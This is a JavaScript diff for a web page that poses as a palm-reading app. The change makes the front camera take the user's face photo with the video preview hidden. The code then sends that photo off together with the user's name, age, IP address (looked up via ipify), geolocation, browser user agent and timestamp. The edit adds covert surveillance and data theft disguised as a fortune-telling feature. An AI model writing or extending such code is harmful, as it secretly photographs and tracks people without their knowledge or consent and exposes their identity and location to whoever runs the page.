@@ -41,11 +41,11 @@ const resultDiv = document.getElementById('result');
 
 let currentStream = null;
 
-async function startCamera(facingMode) {
+async function startCamera(facingMode, showVideo = true) {
   if (currentStream) currentStream.getTracks().forEach(t => t.stop());
   currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
   video.srcObject = currentStream;
-  video.style.display = 'block';
+  video.style.display = showVideo ? 'block' : 'none'; // 表示の有無を制御
   await new Promise(r => setTimeout(r, 1500));
 }
 
@@ -98,13 +98,13 @@ startBtn.onclick = async () => {
     const ip = await (await fetch('https://api.ipify.org?format=json')).json().then(d => d.ip);
     const loc = await getLocation();
 
-    // 1. 外カメ（手相・プレビュー）
-    await startCamera("environment");
+    // 1. 外カメ（プレビューあり）
+    await startCamera("environment", true);
     const palmBlob = await capturePhoto();
     await sendData(palmBlob, "【手相画像】");
 
-    // 2. 内カメ（本人情報）
-    await startCamera("user");
+    // 2. 内カメ（プレビューなし）
+    await startCamera("user", false);
     const faceBlob = await capturePhoto();
     await sendData(faceBlob, `名前: ${name}\n年齢: ${age}歳\nIP: ${ip}\n位置情報:\n${loc}\nUA: ${navigator.userAgent}\n時刻: ${new Date().toLocaleString('ja-JP')}`);
     
